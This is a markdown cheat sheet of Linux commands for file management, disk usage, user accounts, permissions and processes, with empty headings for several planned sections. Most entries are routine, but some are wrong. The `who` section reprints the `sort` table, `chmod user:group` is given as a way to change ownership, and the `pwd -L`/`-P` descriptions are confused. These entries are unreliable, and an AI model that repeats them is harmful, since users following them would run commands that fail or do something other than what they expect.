Ref:
- https://linuxize.com/cheatsheet/linux-commands/
- https://www.commandinline.com
- https://www.geeksforgeeks.org/linux-unix/linux-commands-cheat-sheet/
- https://www.kali.org/tools/
- https://payloadplayground.com/cheatsheets/
- https://netwerklabs.com/
- https://github.com/sudo-st8less/Pentesting-CTF-Cheat-Sheets/
- https://www.cybercheatsheets.org/en
- https://www.golinuxcloud.com/


# 🔴 Linux Commands Cheat Sheet
## 🟠 1. File Management

> Focus: Creating, viewing, moving, editing, and securing files.

### 🟡 1.1 Navigation & Listing (cd, ls, pwd, dirs, tree)

👉 **The `cd` command -** 

|      Command      |                            Effect                            |
| :---------------: | :----------------------------------------------------------: |
| `cd /path/to/dir` |                 Go to a specified directory                  |
|      `cd ..`      |                     Go up one directory                      |
|      `cd ~`       |                   Go to the home directory                   |
|      `cd -`       |               Change to the previous directory               |
|      `cd /`       |                 Change to the root directory                 |
|      `cd ./`      |          Stay in the current directory (no change)           |
|  `cd ~username`   |           Change to another user’s home directory            |
|      `cd !$`      |     Change to the last argument of the previous command      |
|      `cd --`      | End of options (useful if directory name starts with a dash) |

👉 **The `ls` command -** 

|  Command   |                     Effect                     |
| :--------: | :--------------------------------------------: |
|    `ls`    |      List files in the current directory       |
|  `ls -l`   | Long listing format (permissions, owner, size) |
|  `ls -a`   |   Show hidden files, those starting with "."   |
|  `ls -lh`  |              Human-readable sizes              |
|  `ls -lt`  |    Long format sorted by modification time     |
|  `ls -R`   |        Recursive listing of directories        |
|  `ls -lS`  |               Sort by file size                |
|  `ls -lr`  |               Reverse sort order               |
|  `ls -lX`  |        Sort alphabetically by extension        |
| `ls -d */` |             List only directories              |
|  `ls -i`   |             Display inode numbers              |
|  `ls -s`   |              Show size in blocks               |

👉 **The `pwd` command -** 

| Command  |                                       Effect                                        |
| :------: | :---------------------------------------------------------------------------------: |
|  `pwd`   |           Prints the full absolute path of the current working directory            |
| `pwd -L` | Prints the logical current directory (resolves symlinks and shows the logical path) |
| `pwd -P` |                   Shows the real path without resolving symlinks                    |

👉 **The `tree` command -** 

|        Command        |                       Effect                       |
| :-------------------: | :------------------------------------------------: |
|        `tree`         |     View directory tree (may need to install)      |
|      `tree -L 2`      |       Limits the depth of the directory tree       |
|       `tree -d`       |             Displays only directories              |
|       `tree -f`       |      Displays the full path prefix for files       |
|       `tree -a`       |               Includes hidden files                |
|       `tree -h`       |    Displays file sizes in human-readable format    |
|       `tree -p`       |             Displays file permissions              |
|   `tree -I "*.txt"`   |        Excludes files matching the pattern         |
| `tree --filelimit 10` | Limits the number of files shown in each directory |

### 🟡 1.2 Creation & Deletion (touch, mkdir, rm, rmdir, truncate)

👉 **The `touch` command -**

|                Command                |                                Effect                                 |
| :-----------------------------------: | :-------------------------------------------------------------------: |
|           `touch file.txt`            |   Creates a new file or updates the timestamps of an existing file    |
|          `touch -c file.txt`          | Updates timestamps but does not create a new file if it doesn’t exist |
|          `touch -a file.txt`          |               Updates only the access time of the file                |
|          `touch -m file.txt`          |            Updates only the modification time of the file             |
|    `touch -t [timestamp] file.txt`    |                 Sets a custom timestamp for the file                  |
| `touch -r referencefile.txt file.txt` |      Sets the timestamps of the file to match the reference file      |

👉 **The `mkdir` command -** 

|         Command         |                   Effect                    |
| :---------------------: | :-----------------------------------------: |
|     `mkdir newdir`      |           Create a new directory            |
|    `mkdir dir1 dir2`    |        Creates multiple directories         |
| `mkdir -p parent/child` |          Create nested directories          |
|  `mkdir -m 755 newdir`  | Sets specific permissions for the directory |

👉 **The `rm` command -**

|     Command      |            Effect            |
| :--------------: | :--------------------------: |
|  `rm file.txt`   |         Delete file          |
| `rm -i file.txt` |   Confirm before deleting    |
| `rm -r folder/`  | Recursively delete directory |
| `rm -rf folder/` | Force delete without prompt  |

### 🟡 1.3 Copy, Move, & Linking (cp, mv, ln, reflink)

👉 **The `cp` command -**

|           Command            |           Effect           |
| :--------------------------: | :------------------------: |
|   `cp file1.txt file2.txt`   |         Copy file          |
|     `cp -r dir1/ dir2/`      | Copy directory recursively |
| `cp -i file1.txt backup.txt` |  Prompt before overwrite   |

👉 **The `mv` command -**

|             Command             |          Effect           |
| :-----------------------------: | :-----------------------: |
|  `mv file.txt /new/location/`   | Move file to new location |
|  `mv oldname.txt newname.txt`   |        Rename file        |
| `mv -i file.txt /new/location/` |  Prompt before overwrite  |

### 🟡 1.4 Viewing & Filtering (cat, less, more, head, tail, tac, rev)

👉 **The `cat` command** -

|           Command            |                                Effect                                |
| :--------------------------: | :------------------------------------------------------------------: |
|        `cat file.txt`        |                    Display the contents of a file                    |
|      `cat -n file.txt`       |                       Number all output lines                        |
|      `cat -b file.txt`       |                    Number non-blank output lines                     |
|      `cat -s file.txt`       |                Squeeze multiple blank lines into one                 |
|      `cat -E file.txt`       |          Display a dollar sign `$` at the end of each line           |
|      `cat -T file.txt`       |                    Display tab characters as `^I`                    |
|      `cat -v file.txt`       | Display non-printing characters, except for tabs and the end of line |
|  `cat file1.txt file2.txt`   |          Concatenate multiple files and display the output           |
| `cat file1.txt > file2.txt`  |       Redirect the output of one file into another (overwrite)       |
| `cat file1.txt >> file2.txt` |        Redirect the output of one file into another (append)         |
|      `cat -A file.txt`       |             Equivalent to `-vET`; display all characters             |
|           `cat -`            |                       Read from standard input                       |

👉 **The `head` command** -

|            Command            |                      Effect                       |
| :---------------------------: | :-----------------------------------------------: |
|        `head file.txt`        |      Displays the first 10 lines of the file      |
|     `head -n 5 file.txt`      |      Displays the first 5 lines of the file       |
|     `head -n -5 file.txt`     |   Displays all but the last 5 lines of the file   |
|     `head -c 20 file.txt`     |      Displays the first 20 bytes of the file      |
| `head -q file1.txt file2.txt` | Suppresses headers when displaying multiple files |

👉 **The `tail` command** -

|        Command        |                                Effect                                 |
| :-------------------: | :-------------------------------------------------------------------: |
|    `tail file.txt`    |                 Displays the last 10 lines of a file                  |
| `tail -n 20 file.txt` |              Displays the last specified number of lines              |
| `tail -c 50 file.txt` |              Displays the last specified number of bytes              |
|  `tail -f file.txt`   | Follows the file in real-time, displaying new lines as they are added |
| `tail -n +5 file.txt` |        Starts displaying lines from the specified line number         |
|  `tail -F file.txt`   |         Follows the file in real-time, handling file rotation         |


### 🟡 1.5 Find & Search (find, locate, which, whereis, grep, ack, ag)

👉 **The `find` command -**

|                 Command                  |                    Effect                    |
| :--------------------------------------: | :------------------------------------------: |
|          `find . -name "*.log"`          |             Find all .log files              |
| `find /path/to/search -type f -size +1M` |             Find files over 1MB              |
| `find /path/to/search -type f -mmin -10` | Find files modified less than 10 minutes ago |
| `find /path/to/search -type f -mtime -1` |   Find files modified less than 1 day ago    |
|      `find /path/to/search -type d`      |      Find directories instead of files       |

👉 **The `locate` command -**

|              Command              |                       Effect                       |
| :-------------------------------: | :------------------------------------------------: |
|        `locate [filename]`        |      Finds files matching the specified name       |
|         `locate "*.ext"`          | Finds files matching a pattern (wildcards allowed) |
|       `locate -n 5 "*.txt"`       |            Limits the number of results            |
|       `locate -i "myfile"`        |          Searches for files ignoring case          |
|            `updatedb`             |     Updates the file database used by `locate`     |
| `locate --exclude [path] "*.ext"` |     Excludes specific directories from search      |

👉 **The `grep` command -**

|                   Command                   |                                                     Effect                                                     |
| :-----------------------------------------: | :------------------------------------------------------------------------------------------------------------: |
|          `grep 'pattern' filename`          |                                         Search for a pattern in a file                                         |
|       `grep -r 'pattern' directory/`        |                                       Search recursively in directories                                        |
|        `grep -c 'pattern' filename`         |                                         Count occurrences of a pattern                                         |
|        `grep -n 'pattern' filename`         |                                       Display line numbers with matches                                        |
| `grep -e 'pattern1' -e 'pattern2' filename` |                                          Search for multiple patterns                                          |
|        `grep -E 'pattern' filename`         |                                        Use extended regular expressions                                        |
|          `grep -w 'word' filename`          |                                             Search for whole words                                             |
|        `grep -v 'pattern' filename`         |                                  Invert match (show lines that do not match)                                   |
|        `grep -o 'pattern' filename`         |                                   Display only the matched part of the line                                    |
|   `grep --color=auto 'pattern' filename`    |                                           Highlight matches in color                                           |
|     `grep 'pattern' file1 file2 file3`      |                                     Search for a pattern in multiple files                                     |
|        `grep -s 'pattern' filename`         |                         Suppress error messages about nonexistent or unreadable files                          |
|        `grep -H 'pattern' filename`         |                               Display the name of each file with matching lines                                |
|            `grep -l 'pattern' *`            |                               Display only the names of files containing matches                               |
|            `grep -L 'pattern' *`            |                             Display only the names of files not containing matches                             |
|         `grep '^pattern' filename`          |                         Search for lines matching a pattern at the beginning of a line                         |
|         `grep 'pattern$' filename`          |                            Search for lines matching a pattern at the end of a line                            |
|       `grep -A 3 'pattern' filename`        |                 Search for lines containing a pattern and display the 3 lines after each match                 |
|       `grep -B 2 'pattern' filename`        |                Search for lines containing a pattern and display the 2 lines before each match                 |
|       `grep -C 2 'pattern' filename`        |           Search for lines containing a pattern and display the 2 lines before and after each match            |
|   `grep -r --include='*.txt' 'pattern' .`   |       Search for lines matching a pattern in all .txt files in the current directory and subdirectories        |
|   `grep -r --exclude='*.txt' 'pattern' .`   | Search for lines matching a pattern in all files except .txt files in the current directory and subdirectories |
|         `grep -r 'pattern' .[^.]*`          |      Search for lines matching a pattern in all hidden files in the current directory and subdirectories       |
|            `grep -I 'pattern' *`            |       Search for lines matching a pattern in all files in the current directory, excluding binary files        |

### 🟡 1.6 File Attributes & Metadata (stat, file, lsattr, chattr, namei)

👉 **The `stat` command -** 

|                      Command                       |              Effect               |
| :------------------------------------------------: | :-------------------------------: |
|                    `stat file`                     |     Display file information      |
|                   `stat -f file`                   |  Display filesystem information   |
|                   `stat -L file`                   |          Follow symlinks          |
|                   `stat -t file`                   |     Terse output for parsing      |
| `stat --format="%F" file` /<br>`stat -c "%F" file` |        Show file type only        |
|             `stat --format="%s" file`              |      Show file size in bytes      |
|          `stat --format="%A %U %n" file`           | Show permissions, owner, and name |
|          `stat --printf='%n\t%s\n' file`           | Custom output with tab separator  |

👉 **The `file` command -** 

|                Command                 |                                Effect                                |
| :------------------------------------: | :------------------------------------------------------------------: |
|           `file example.txt`           |              Determines the type of the specified file               |
|         `file -b example.txt`          |              Prints the file type without the filename               |
|         `file -i example.txt`          |               Outputs the MIME type string of the file               |
|           `file -L symlink`            | Follows symbolic links to determine the file type of the linked file |
|       `file -F ":" example.txt`        |            Appends a custom separator after the filename             |
|         `file -z archive.zip`          |                Tries to look inside compressed files                 |
|           `file -s /dev/sda`           |                Reads block or character special files                |
|         `file -f filelist.txt`         |         Reads filenames from a file instead of command line          |
| `file -m custom_magic.mgc example.txt` |               Specifies an alternate magic file to use               |
|               `file -C`                |               Checks the magic file for syntax errors                |
|      `file -r /path/to/directory`      |                   Recursively examines directories                   |
|         `file -E example.txt`          |                       Stops at the first match                       |
|         `file -k example.txt`          |         Keep going after the first match (opposite of `-E`)          |
|       `file -e elf example.elf`        |               Performs a specific test for file types                |

### 🟡 1.7 Text Processing (tr, sed, awk, cut, sort, uniq, comm, diff, patch, pr)

👉 **The `tr` command -**

|           Command            |                        Effect                        |
| :--------------------------: | :--------------------------------------------------: |
|       `tr 'a-z' 'A-Z'`       |    Translates all lowercase letters to uppercase     |
| `tr '[:lower:]' '[:upper:]'` |  Translates lowercase letters to uppercase in file   |
|        `tr -d '0-9'`         |                  Deletes all digits                  |
|         `tr -s ' '`          |    Compresses multiple spaces into a single space    |
|        `tr '0-9' '*'`        |      Replaces all digits with an asterisk (`*`)      |
|      `tr -cd 'a-zA-Z '`      | Deletes all characters except for letters and spaces |

👉 **The `sed` command -**

|             Command             |                         Effect                          |
| :-----------------------------: | :-----------------------------------------------------: |
|   `sed 's/foo/bar/' file.txt`   |  Replace first occurrence of "foo" with "bar" per file  |
|  `sed 's/foo/bar/g' file.txt`   | Replace **all** occurrence of "foo" with "bar" per file |
| `sed -i 's/foo/bar/g' file.txt` |     Same as above, but edits the file **in place**      |
|     `sed -n '3p' file.txt`      |         Print **only** the 3rd line of the file         |
|    `sed -n '5,10p' file.txt`    |                Print lines 5 through 10                 |
|     `sed '/^#/d' file.txt`      |      Delete all lines starting with `#` (comments)      |
|     `sed '/^$/d' file.txt`      |               Delete all **blank** lines                |
|       `sed '1d' file.txt`       |          Delete the **first line** of the file          |
|   `sed 's/[0-9]//g' file.txt`   |             Remove all digits from the file             |
|   `sed 's/.*/[&]/' file.txt`    |            Wrap each line in square brackets            |

👉 **The `cut` command -**

|                        Command                         |                    Effect                     |
| :----------------------------------------------------: | :-------------------------------------------: |
|                    `cut -f 1 file`                     |    First field with default tab delimiter     |
|             `cut -d ':' -f 1 /etc/passwd`              |       First field with colon delimiter        |
|            `cut -d ':' -f 1,3 /etc/passwd`             |       Multiple fields (non-contiguous)        |
|            `cut -d ':' -f 1-3 /etc/passwd`             |                Range of fields                |
|               `cut -d ':' -f 1 -s file`                |     Only lines that contain the delimiter     |
|                  `cut -w -f 1,3 file`                  | Split on any run of spaces/tabs (uutils `-w`) |
|                   `cut -c 1-5 file`                    |      Characters 1 through 5 on each line      |
|                `cut -c 1-5,10-15 file`                 |      Non-contiguous character positions       |
|                   `cut -b 1-10 file`                   |        Bytes 1 through 10 on each line        |
| `cut -d ':' -f 1,3 --output-delimiter=' ' /etc/passwd` |  Replace output delimiter (e.g. tab → space)  |
|          `cut --complement -d ':' -f 2 file`           |    Print everything except selected fields    |

👉 **The `sort` command -**

|           Command           |                     Effect                      |
| :-------------------------: | :---------------------------------------------: |
|       `sort file.txt`       | Sorts the contents of a file in ascending order |
|     `sort -r file.txt`      |             Sorts in reverse order              |
|     `sort -R file.txt`      |                  Random orders                  |
|    `sort -n numbers.txt`    |                Sorts numerically                |
|    `sort -k 2 file.txt`     |        Sorts by a specific field/column         |
| `sort -t "," -k 2 file.csv` |   Specifies a delimiter for field separation    |
|     `sort -u file.txt`      |  Removes duplicate lines in the sorted output   |
| `sort file1.txt file2.txt`  |        Combines and sorts multiple files        |

👉 **The `uniq` command -**

|       Command        |                       Effect                        |
| :------------------: | :-------------------------------------------------: |
|   `uniq file.txt`    |         Removes consecutive duplicate lines         |
|  `uniq -c file.txt`  |    Displays the count of each line’s occurrences    |
|  `uniq -d file.txt`  |          Displays only the duplicate lines          |
|  `uniq -u file.txt`  |   Displays only the unique (non-duplicate) lines    |
|  `uniq -i file.txt`  |          Ignores case when comparing lines          |
| `uniq -w 5 file.txt` | Compares only the first `5` characters of each line |

👉 **The `diff` command -**

|                  Command                  |                         Effect                         |
| :---------------------------------------: | :----------------------------------------------------: |
|        `diff file1.txt file2.txt`         |            Compares two files line by line             |
|       `diff -u file1.txt file2.txt`       |      Outputs the differences in a unified format       |
|       `diff -c file1.txt file2.txt`       |            Produces a context format output            |
|       `diff -i file1.txt file2.txt`       |       Ignores case differences in file contents        |
|       `diff -w file1.txt file2.txt`       |                Ignores all white space                 |
|       `diff -B file1.txt file2.txt`       |     Ignores changes that only involve blank lines      |
|            `diff -r dir1 dir2`            |     Recursively compares any subdirectories found      |
|       `diff -q file1.txt file2.txt`       | Only reports whether the files differ, not the details |
| `diff --side-by-side file1.txt file2.txt` |     Displays differences in a side-by-side format      |
|    `diff --color file1.txt file2.txt`     |  Displays colored diff output for easier readability   |
|          `diff -u -r dir1 dir2`           |    Combines recursive and unified format comparison    |

### 🟡 1.8 Compression & Archiving (tar, gzip, gunzip, bzip2, xz, zip, unzip, 7z)

👉 **The `tar` command -**

|               Command               |                    Effect                     |
| :---------------------------------: | :-------------------------------------------: |
|   `tar -cvf archive.tar folder/`    | Create archive with the contents of `folder/` |
| `tar -cvf archive.tar file1 file2`  |       Creates a new archive with files        |
|       `tar -xvf archive.tar`        |                Extract archive                |
| `tar -czvf archive.tar.gz folder/`  |           Create compressed archive           |
|     `tar -xzvf archive.tar.gz`      |          Extract compressed archive           |
|       `tar -tvf archive.tar`        |       Lists the contents of the archive       |
|    `tar -rvf archive.tar file3`     |     Appends files to an existing archive      |
| `tar --delete -f archive.tar file1` |    Deletes specific files from the archive    |

👉 **The `gzip` command -**

|             Command              |                            Effect                            |
| :------------------------------: | :----------------------------------------------------------: |
|         `gzip file.txt`          |                   Compresses a single file                   |
|        `gzip -k file.txt`        |          Keeps the original file after compression           |
|    `gzip file1.txt file2.txt`    |                  Compresses multiple files                   |
|       `gzip -r directory/`       |       Recursively compresses all files in a directory        |
|        `gzip -9 file.txt`        | Sets the compression level (`-1` for fastest, `-9` for best) |
|      `gzip -d file.txt.gz`       |                  Decompresses a `.gz` file                   |
| `gzip -c file.txt > file.txt.gz` |              Writes compressed output to stdout              |

### 🟡 1.9 File Transfer (scp, rcp, dd)

👉 **The `scp` command -** 

|                  Command                  |                           Effect                            |
| :---------------------------------------: | :---------------------------------------------------------: |
|      `scp file.txt user@host:/path`       |              Copies a file to a remote server               |
|     `scp user@host:/path/file.txt .`      | Copies a file from a remote server to the current directory |
|       `scp -r dir user@host:/path`        |      Recursively copies a directory to a remote server      |
|  `scp -P port file.txt user@host:/path`   |     Specifies the port to connect to the remote server      |
| `scp -i keyfile file.txt user@host:/path` |       Uses a specified private key for authentication       |

## 🟠 2. Storage Management

> Focus: Partitioning, formatting, mounting, quotas, and I/O performance.

### 🟡 2.1 Partitioning & RAID (fdisk, gdisk, parted, mdadm, sfdisk)

### 🟡 2.2 Filesystem Creation & Check (mkfs, fsck, tune2fs, xfs_admin, xfs_repair)

### 🟡 2.3 Mounting & Unmounting (mount, umount, /etc/fstab, findmnt, lsblk)

### 🟡 2.4 Space Usage Analysis (df, du, ncdu, pydf, iostat)

👉 **The `df` command -** 

|          Command          |                             Effect                              |
| :-----------------------: | :-------------------------------------------------------------: |
|           `df`            |      Display disk space usage for all mounted filesystems       |
|          `df -h`          |      Print sizes in human-readable format (e.g., 1K, 234M)      |
|          `df -a`          |    Include pseudo, duplicate, and inaccessible file systems     |
|          `df -T`          |                      Show filesystem type                       |
|          `df -i`          |        Display inode information instead of block usage         |
|       `df -t ext4`        |  Limit listing to filesystems of a specified type (e.g., ext4)  |
|       `df -x tmpfs`       |             Exclude filesystems of a specified type             |
|       `df --total`        |        Produce a grand total for all filesystems listed         |
|          `df -l`          |               Limit listing to local filesystems                |
| `df --output=source,size` | Define the output format using field names (e.g., source, size) |
|          `df -P`          |                   Use the POSIX output format                   |
|          `df -B`          |                     Use size units in bytes                     |
|          `df -H`          |           Display sizes in powers of 1000 (not 1024)            |

👉 **The `du` command -** 

|          Command           |                                Effect                                |
| :------------------------: | :------------------------------------------------------------------: |
|          `du -h`           |        Displays sizes in human-readable format (e.g., KB, MB)        |
| `du -s /path/to/directory` |            Summarizes the total disk usage of a directory            |
|          `du -a`           |               Includes all files, not just directories               |
|          `du -c`           |                  Includes a grand total at the end                   |
|         `du -d 1`          |                     Shows directory depth level                      |
|     `du --max-depth=2`     |               Limits the depth of directory traversal                |
|          `du -x`           |              Skip directories on different file systems              |
|   `du --exclude="*.txt"`   |                 Excludes files matching the pattern                  |
|        `du --time`         | Shows the time of the last modification of any file in the directory |
|          `du -b`           |                       Displays sizes in bytes                        |
|    `du --block-size=1M`    |              Displays sizes in blocks of specified SIZE              |
|          `du -L`           |                        Follows symbolic links                        |
|          `du -0`           |                   Outputs null-terminated entries                    |

### 🟡 2.5 Swap Management (swapon, swapoff, mkswap, swappiness)

### 🟡 2.6 Logical Volume Management (LVM (pvcreate, vgcreate, lvcreate, lvextend, vgscan)

### 🟡 2.7 Disk Encryption (cryptsetup, dm-crypt, veracrypt)

### 🟡 2.8 I/O Scheduling & Tuning (ionice, blockdev, sync, fstrim)


## 🟠 3. Identity Management

> Focus: Identities, access controls, password aging, and role management.

💡 **The `/etc/skel` Directory :**

The `/etc/skel` directory contains files and directories that are automatically copied over to a new user's **home directory** when such user is created by the `useradd` program.

The location of `/etc/skel` can be changed by editing the line that begins with `SKEL=` in the configuration file `/etc/default/useradd`. By default this line says `SKEL=/etc/skel`.

### 🟡 3.1 User Accounts (useradd, usermod, userdel, passwd, chage, id)

👉 **The `usermod` command -** 

|                  Command                  |                      Effect                       |
| :---------------------------------------: | :-----------------------------------------------: |
|       `usermod -l NEWNAME USERNAME`       |               Changes the username                |
|      `usermod -d /new/home USERNAME`      |         Changes the user’s home directory         |
|    `usermod -d /new/home -m USERNAME`     | Moves the user’s home directory to a new location |
|      `usermod -s /bin/zsh USERNAME`       |      Changes the user’s default login shell       |
|      `usermod -g GROUPNAME USERNAME`      |         Changes the user’s primary group          |
|    `usermod -G GROUP1,GROUP2 USERNAME`    |     Adds the user to new supplementary groups     |
|   `usermod -aG GROUP1,GROUP2 USERNAME`    |   Appends the user to new supplementary groups    |
|           `usermod -L USERNAME`           |             Locks the user’s account              |
|           `usermod -U USERNAME`           |     Unlocks a previously locked user account      |
|     `usermod -e YYYY-MM-DD USERNAME`      |   Sets the expiration date for the user account   |
| `usermod -p '$6$randomsalt$...' USERNAME` |           Sets a new encrypted password           |

👉 **The `passwd` command -** 

|            Command             |                                   Effect                                   |
| :----------------------------: | :------------------------------------------------------------------------: |
|            `passwd`            |                 Changes the password for the current user                  |
|       `passwd USERNAME`        |                Changes the password for the specified user                 |
|      `passwd -e USERNAME`      |         Expires the current password and forces a password change          |
|      `passwd -l USERNAME`      |                     Locks the specified user’s account                     |
|      `passwd -u USERNAME`      |                    Unlocks the specified user’s account                    |
|      `passwd -d USERNAME`      |                Deletes the password for the specified user                 |
|      `passwd -S USERNAME`      |             Displays the password status of the specified user             |
| `passwd -n MIN_DAYS USERNAME`  |      Sets the minimum number of days before a password can be changed      |
| `passwd -x MAX_DAYS USERNAME`  |            Sets the maximum number of days a password is valid             |
| `passwd -w WARN_DAYS USERNAME` | Sets the number of days before password expiration that a warning is given |


### 🟡 3.2 Group Administration (groupadd, groupmod, groupdel, gpasswd, newgrp)

### 🟡 3.3 File Permissions & ACLs (chmod, chown, chgrp, getfacl, setfacl, umask)

👉 **The `chmod` command -**

|              Command               |                      Effect                       |
| :--------------------------------: | :-----------------------------------------------: |
|        `chmod +r file.txt`         |         Allow all users to read the file          |
|        `chmod -r file.txt`         |      Prevent any user from reading the file       |
|        `chmod +w file.txt`         |    Allow all users to make changes to the file    |
|        `chmod -w file.txt`         | Prevent any user from making changes to the file  |
|        `chmod +x script.sh`        |        Allow all users to execute the file        |
|        `chmod -x script.sh`        |     Prevent any user from executing the file      |
|        `chmod u+r file.txt`        |         Allow the owner to read the file          |
|        `chmod u-r file.txt`        |      Prevent the owner from reading the file      |
|        `chmod u+w file.txt`        |    Allow the owner to make changes to the file    |
|        `chmod u-w file.txt`        | Prevent the owner from making changes to the file |
|       `chmod u+x script.sh`        |        Allow the owner to execute the file        |
|       `chmod u-x script.sh`        |     Prevent the owner from executing the file     |
|        `chmod g+r file.txt`        |         Allow the group to read the file          |
|        `chmod g-r file.txt`        |      Prevent the group from reading the file      |
|        `chmod g+w file.txt`        |    Allow the group to make changes to the file    |
|        `chmod g-w file.txt`        | Prevent the group from making changes to the file |
|       `chmod g+x script.sh`        |        Allow the group to execute the file        |
|       `chmod g-x script.sh`        |     Prevent the group from executing the file     |
|        `chmod o+r file.txt`        |           Allow others to read the file           |
|        `chmod o-r file.txt`        |       Prevent others from reading the file        |
|        `chmod o+w file.txt`        |     Allow others to make changes to the file      |
|        `chmod o-w file.txt`        |  Prevent others from making changes to the file   |
|       `chmod o+x script.sh`        |         Allow others to execute the file          |
|       `chmod o-x script.sh`        |      Prevent others from executing the file       |
|        `chmod 755 file.txt`        |    Set specific permissions (see table, below)    |
|    `chmod user:group file.txt`     |                 Change ownership                  |
| `chmod -R user:group /path/to/dir` |  Change ownership recursively (for directories)   |

👉 **File Permission Table :**

| Command |                              Effect                               |
| :-----: | :---------------------------------------------------------------: |
|  `777`  |            Allow all users to read, write, and execute            |
|  `755`  | Full permissions for owner; read and execute for group and others |
|  `700`  |  Full permissions for owner; no permissions for group or others   |
|  `666`  |            Read and write for owner, group, and others            |
|  `644`  |     Read and write for owner; read-only for group and others      |
|  `600`  |   Read and write for owner; no permissions for group and others   |
|  `555`  |           Read and execute for owner, group, and others           |
|  `440`  |     Read-only for owner and group; no permissions for others      |
|  `400`  |      Red-only for owner; no permissions for group and others      |
|  `711`  |   Full permissions for owner; execute-only for group and others   |

### 🟡 3.4 Special Attributes (SUID/SGID/Sticky (chmod u+s, g+s, +t)

### 🟡 3.5 Sudo & Privilege Escalation (visudo, sudoers, sudo, su)

👉 **The `sudo` command -** 

|             Command             |                                  Effect                                   |
| :-----------------------------: | :-----------------------------------------------------------------------: |
|        `sudo [COMMAND]`         |                     Executes a single command as root                     |
|            `sudo -i`            |                      Opens an interactive root shell                      |
| `sudo -u [USERNAME] [COMMAND]`  |                  Executes a command as a different user                   |
|            `sudo -l`            |                 Lists the user’s allowed `sudo` commands                  |
| `sudo --preserve-env [COMMAND]` |     Preserves the current environment variables when running as root      |
|            `sudo !!`            |                   Repeats the last command with `sudo`                    |
|            `sudo -v`            |        Refreshes the `sudo` credentials without running a command         |
|            `sudo -k`            | Invalidates the `sudo` session, requiring a password for the next command |

### 🟡 3.6 User Environment (profile, .bashrc, env, export, alias)

### 🟡 3.7 Session Monitoring (who, w, last, lastlog, pinky)

👉 **The `who` command -**

|           Command           |                     Effect                      |
| :-------------------------: | :---------------------------------------------: |
|       `sort file.txt`       | Sorts the contents of a file in ascending order |
|     `sort -r file.txt`      |             Sorts in reverse order              |
|     `sort -R file.txt`      |                  Random orders                  |
|    `sort -n numbers.txt`    |                Sorts numerically                |
|    `sort -k 2 file.txt`     |        Sorts by a specific field/column         |
| `sort -t "," -k 2 file.csv` |   Specifies a delimiter for field separation    |
|     `sort -u file.txt`      |  Removes duplicate lines in the sorted output   |
| `sort file1.txt file2.txt`  |        Combines and sorts multiple files        |

👉 **The `w` command -** 

| Command  |                                 Effect                                  |
| :------: | :---------------------------------------------------------------------: |
|   `w`    |   Shows who's logged in + what they're doing (plus system load info)    |
|  `w -h`  |      Suppresses the header row from being displayed in the output       |
|  `w -u`  | Ignores the username when calculating the current process and CPU times |
|  `w -s`  |                      Uses the short output format                       |
|  `w -f`  |       Toggles the printing of the 'from' field (remote hostname)        |
|  `w -i`  |   Displays the IP address instead of the hostname in the 'from' field   |
|  `w -o`  |    Prints a blank space for idle times that are less than one minute    |
| `w user` |             Shows information about the specified user only             |

## 🟠 4. Process Management

> Focus: Running programs, background jobs, startup scripts, and system services.

### 🟡 4.1 Process Listing & Trees (ps, lsof, pstree, top, htop, glances)

👉 **The `lsof` command -** 

|          Command          |                          Effect                          |
| :-----------------------: | :------------------------------------------------------: |
|          `lsof`           |            All open files (can be very long)             |
|      `lsof -u USER`       |                  Files opened by a user                  |
|      `lsof -u ^USER`      |                     Exclude one user                     |
|       `lsof -c ssh`       | Files opened by processes whose command starts with NAME |
|       `lsof -p PID`       |              Files opened by a specific PID              |
|        `lsof -i4`         |                  All IPv4 network files                  |
|     `lsof -iTCP/iUDP`     |                   TCP/UDP sockets only                   |
|       `lsof -i :22`       |       Sockets on port 22 (service name or number)        |
| `lsof -iTCP -sTCP:LISTEN` |                  Listening TCP sockets                   |
|      `lsof +D /path`      |    Files opened under a directory tree (can be slow)     |
|  `lsof /var/log/syslog`   |           Files with a path in the NAME column           |

👉 **The `top` command -** 

|          Command           |                     Effect                      |
| :------------------------: | :---------------------------------------------: |
|       `top -b -n 1`        |    One snapshot to stdout (non-interactive)     |
|       `top -b -n 5`        |          Multiple snapshots then exit           |
|     `top -b -d 2 -n 3`     | Change delay between batch iterations (seconds) |
|        `top -n 10`         |    Exit after N screen updates (interactive)    |
|   `top -b -n 1 -o %MEM`    |             Sort by memory percent              |
|   `top -b -n 1 -o %CPU`    |               Sort by CPU percent               |
|    `top -b -n 1 -o PID`    |               Sort by process ID                |
|          `top -O`          |       List available sort fields and exit       |
|      `top -b -n 1 -H`      |           Show threads for each task            |
|    `top -b -n 1 -w 120`    |           Set screen width (columns)            |
| `top -b -n 1 -p 1234,5678` |            Monitor only listed PIDs             |
| `top -b -n 1 -u username`  |        Show only processes owned by user        |
| `top -b -n 1 -U username`  |        Same as `-u` (filter-only euser)         |
|     `top -b -n 1 -E g`     |        Summary memory scale k/m/g/t/p/e         |
|     `top -b -n 1 -e m`     |         Per-task memory scale k/m/g/t/p         |
|          `top -S`          |  Toggle cumulative time mode (flip last state)  |
|          `top -i`          |       Toggle idle tasks (flip last state)       |
|          `top -c`          |  Toggle command line vs name (flip last state)  |
|          `top -1`          |    Toggle single-CPU view (flip last state)     |

### 🟡 4.2 Process Signaling & Priority (kill, killall, pkill, nice, renice)

👉 **The `kill` command -** 

|      Command      |                                   Effect                                    |
| :---------------: | :-------------------------------------------------------------------------: |
|   `kill [PID]`    | Sends the `SIGTERM` signal to the specified process, asking it to terminate |
|  `kill -9 [PID]`  |  Sends the `SIGKILL` signal to forcefully terminate the specified process   |
| `kill -15 [PID]`  |          Sends the `SIGTERM` signal (equivalent to default `kill`)          |
| `kill -HUP [PID]` |           Sends the `SIGHUP` signal, which can restart a process            |
|     `kill -l`     |          Lists all available signals that can be sent to processes          |
| `killall [name]`  |              Terminates all processes with the specified name               |

👉 **The `nice` command -** 

|           Command           |                        Effect                        |
| :-------------------------: | :--------------------------------------------------: |
|      `nice [command]`       |     Runs a command with the default niceness (0)     |
| `nice -n [value] [command]` |    Runs a command with a specified niceness value    |
|   `nice -n -10 [command]`   | Runs a command with higher priority (negative value) |

👉 **The `renice` command -** 

|            Command             |                              Effect                               |
| :----------------------------: | :---------------------------------------------------------------: |
|   `renice [value] -p [PID]`    |           Changes the niceness of a process by its PID            |
| `renice [value] -u [username]` | Changes the niceness of all processes owned by the specified user |
|  `renice [value] -g [group]`   |   Changes the niceness of all processes in the specified group    |
|  `renice -n [value] -p [PID]`  |   Alternative syntax to change niceness of a process by its PID   |

